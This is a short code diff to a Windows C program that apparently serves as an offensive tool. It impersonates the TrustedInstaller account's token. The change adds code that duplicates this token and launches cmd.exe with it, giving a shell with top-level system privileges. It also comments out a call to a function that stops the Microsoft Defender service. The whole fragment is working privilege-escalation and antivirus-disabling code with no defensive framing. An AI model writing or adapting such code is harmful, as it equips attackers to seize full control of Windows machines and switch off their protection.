@@ -277,19 +277,22 @@ int main(int argc, char** argv)
 		printf("[-] TrustedInstaller ImpersonateLoggedOnUser() failed: %d\n", GetLastError());
 	}
 
+	BOOL duplicateToken = DuplicateTokenEx(tiTokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
+	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
+
 	CloseHandle(tiTokenHandle);
 
 
 
 
-	if (StopDefenderService())
-	{
-		printf("[+] TRUSTEDINSTALLER StopDefenderService() success!\n");
-	}
-	else
-	{
-		printf("[+] TRUSTEDINSTALLER StopDefenderService() Error : %i!\n", GetLastError());
-	}
+	//if (StopDefenderService())
+	//{
+	//	printf("[+] TRUSTEDINSTALLER StopDefenderService() success!\n");
+	//}
+	//else
+	//{
+	//	printf("[+] TRUSTEDINSTALLER StopDefenderService() Error : %i!\n", GetLastError());
+	//}
 
 	getchar();
 	return 0;
